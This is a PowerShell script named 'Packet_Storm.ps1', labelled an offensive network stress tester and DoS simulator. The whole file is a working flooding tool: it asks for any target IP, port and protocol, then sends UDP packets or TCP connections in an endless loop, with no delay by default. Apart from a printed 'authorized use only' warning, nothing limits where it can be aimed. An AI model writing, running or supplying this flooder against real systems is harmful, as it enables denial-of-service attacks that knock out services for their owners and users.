# Network Stress Tester
# =============================================================================
# FILE: Packet_Storm.ps1
# MODULE: [OFFENSE] NETWORK STRESS TESTER (DoS SIMULATOR)
# ARCHITECT: Navaneethan.P
# =============================================================================

$ErrorActionPreference = "SilentlyContinue"
Clear-Host

Write-Host "===================================================================" -ForegroundColor Red
Write-Host "   PACKET STORM | NETWORK STRESS TESTER" -ForegroundColor White
Write-Host "===================================================================" -ForegroundColor Red
Write-Host "   [WARNING] AUTHORIZED USE ONLY. DO NOT TARGET EXTERNAL SERVERS." -ForegroundColor DarkGray
Write-Host ""

# --- 1. CONFIGURATION ---
$TargetIP = Read-Host "   [?] TARGET IP (e.g. 192.168.1.5)"
if (-not $TargetIP) { exit }

$Port = Read-Host "   [?] TARGET PORT (Default: 80)"
if (-not $Port) { $Port = 80 }

$Protocol = Read-Host "   [?] PROTOCOL (TCP/UDP) [Default: TCP]"
if (-not $Protocol) { $Protocol = "TCP" }

$Delay = Read-Host "   [?] PACKET DELAY (ms) [Default: 0 for Max Speed]"
if (-not $Delay) { $Delay = 0 }

Write-Host ""
Write-Host "   [LOCKED] Target: $TargetIP : $Port ($Protocol)" -ForegroundColor Yellow
Write-Host "   [READY]  Press SPACE to start firing. Press CTRL+C to stop." -ForegroundColor Cyan
Read-Host "   Press Enter to Engage..."

# --- 2. ATTACK LOOP ---
$Bytes = [System.Text.Encoding]::ASCII.GetBytes("DEEPSEARCH_STRESS_TEST_PACKET_DATA_PAYLOAD_X99")
$Count = 0

try {
    while ($true) {
        $Count++
        
        if ($Protocol -eq "UDP") {
            # UDP FIRE (Fire and Forget)
            $UdpClient = New-Object System.Net.Sockets.UdpClient
            $UdpClient.Connect($TargetIP, [int]$Port)
            $UdpClient.Send($Bytes, $Bytes.Length) | Out-Null
            $UdpClient.Close()
            $Status = "UDP PACKET SENT"
        } 
        else {
            # TCP FIRE (Connection Handshake)
            $TcpClient = New-Object System.Net.Sockets.TcpClient
            $Connect = $TcpClient.BeginConnect($TargetIP, [int]$Port, $null, $null)
            $Success = $Connect.AsyncWaitHandle.WaitOne(100, $false) # 100ms Timeout
            
            if ($Success) {
                $Stream = $TcpClient.GetStream()
                $Stream.Write($Bytes, 0, $Bytes.Length)
                $TcpClient.Close()
                $Status = "TCP HIT [OPEN]"
                $Color = "Green"
            } else {
                $Status = "TCP MISS [CLOSED/FILTERED]"
                $Color = "Red"
            }
        }

        # Visual Feedback (Every 10 packets to save CPU)
        if ($Count % 10 -eq 0) {
            Write-Host "   [FIRE] Packet #$Count -> $TargetIP : $Status" -ForegroundColor Green
        }
        
        if ($Delay -gt 0) { Start-Sleep -Milliseconds $Delay }
    }
} catch {
    Write-Host "`n   [STOP] Attack Interrupted or Failed." -ForegroundColor Red
    Write-Host "   Error: $($_.Exception.Message)" -ForegroundColor Gray
}

Write-Host ""
Read-Host "   Press Enter to return to Kernel..."